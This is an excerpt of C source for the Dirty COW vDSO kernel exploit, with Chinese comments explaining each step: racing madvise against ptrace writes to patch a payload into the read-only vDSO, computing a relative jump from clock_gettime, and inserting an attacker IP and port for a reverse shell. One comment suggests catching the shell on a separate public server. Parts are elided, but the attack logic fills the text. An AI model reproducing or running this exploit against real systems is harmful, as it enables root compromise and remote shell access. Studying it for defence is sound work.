...
static struct prologue prologues[] = {						// 预置的一些不同版本vdso中start函数的汇编代码（前3条指令），用于区别版本
...
static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n)
{
	...
	while (n >= sizeof(long)) {				// 8字节为单位循环写入
...
static int patch_payload(struct prologue *p, uint32_t ip, uint16_t port)
{
	...
	for (i = 0; i < ARRAY_SIZE(payload_patch); i++) {			// 依次将port，ip和prologue改掉
...
static int build_vdso_patch(void *vdso_addr, struct prologue *prologue)
{
	...
	vdso_patch[0].addr = (unsigned char *)vdso_addr + VDSO_SIZE - payload_len;		// 在vdso区域找了一片空间用于存放payload

	p = vdso_patch[0].addr;
	for (i = 0; i < payload_len; i++) {			// 先将要存放payload的区域清空
		if (p[i] != '\x00') {
	...
	target = VDSO_SIZE - payload_len - clock_gettime_offset;		// 计算0xe8相对跳转的地址
	memset(buf, '\x90', sizeof(PATTERN_PROLOGUE)-1);
	buf[0] = '\xe8';
	*(uint32_t *)&buf[1] = target - 5;			// 为什么减5？0xe8加上相对地址，这条指令占5个字节
 ...
 */
static void check(struct mem_arg *arg)				// 循环检查
{
	struct vdso_patch *p;
	void *src;
	int i, ret;
	...
	ret = 1;
	for (i = 0; i < LOOP; i++) {
		if (memcmp(p->addr, src, p->size) == 0) {		// 比较目标内p->addr和要patch的内容是否一致
			ret = 0;
			break;
		}
...
{
	if (prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0) == -1)		// 设置父进程死亡时自动给子进程发的信号
		err(1, "prctl(PR_SET_PDEATHSIG)");

	if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1)
		err(1, "ptrace(PTRACE_TRACEME)");

	kill(getpid(), SIGSTOP);			// 停止(stopped)进程的执行.区别于terminate以及interrupt:该进程还未结束, 只是暂停执行. 本信号不能被阻塞, 处理或忽略.
...
static void *ptrace_thread(void *arg_)
{
	...
	if (waitpid(pid, &status, __WALL) == -1) {		// Wait for all children, regardless of type ("clone" or "non-clone").
		warn("waitpid");
		return NULL;
	}
...
static int exploit_helper(struct mem_arg *arg)
{
	...
	if (pid == -1) {
		...
		check(arg);				// 循环比较目标内p->addr和要patch的内容是否一致，一致的话返回
	}

	arg->stop = false;
	pthread_create(&pth1, NULL, madviseThread, arg);		// madvise线程，清除页表及映射关系
	pthread_create(&pth2, NULL, ptrace_thread, arg);		// 往只读空间vdso写入payload和跳转0xe8 xxx

	/* wait for "check" process */
	if (waitpid(pid, &status, 0) == -1) {				// 等待check子进程的返回
		warn("waitpid");
		return -1;
	}

	/* tell the 2 threads to stop and wait for them */
	arg->stop = true;					// 写成功之后通知madvise和ptrace两个线程，可以停止执行了
...
static int exploit(struct mem_arg *arg, bool do_patch)
{
	...
	for (i = 0; i < ARRAY_SIZE(vdso_patch); i++) {				// 有两处需要patch，故执行两次
		if (do_patch)
			arg->patch_number = i;
		else
...
static struct prologue *fingerprint_prologue(void *vdso_addr)
{
	...
	clock_gettime_offset = (uint32_t)entry_point & 0xfff;				// 这里是clock_gettime()函数，某些版本需要更换patch点
	clock_gettime_addr = (unsigned long)vdso_addr + clock_gettime_offset;
...
int main(int argc, char *argv[])
{
	...
	arg.vdso_addr = get_vdso_addr();			// 获取vdso地址
	if (arg.vdso_addr == NULL)
		return EXIT_FAILURE;

	prologue = fingerprint_prologue(arg.vdso_addr);					// 获取此版本vdso的prologue
	if (prologue == NULL) {
	...
	if (patch_payload(prologue, ip, port) == -1)			// 更改payload中的ip，port和prologue项
		return EXIT_FAILURE;

	if (build_vdso_patch(arg.vdso_addr, prologue) == -1)	// vdso区域有两处需要patch，保存好原来的数据，并设置好新数据的指针
		return EXIT_FAILURE;

	// s = create_socket(port);				// 该操作可省略，另找一台公网服务器接收shell
	// if (s == -1)
	// 	return EXIT_FAILURE;

	if (exploit(&arg, true) == -1) {				// 利用dirtycow漏洞往vdso写入patch
		fprintf(stderr, "exploit failed\n");
		return EXIT_FAILURE;
	}

	// yeah(&arg, s);				// 该操作可省略，另找一台公网服务器接收shell
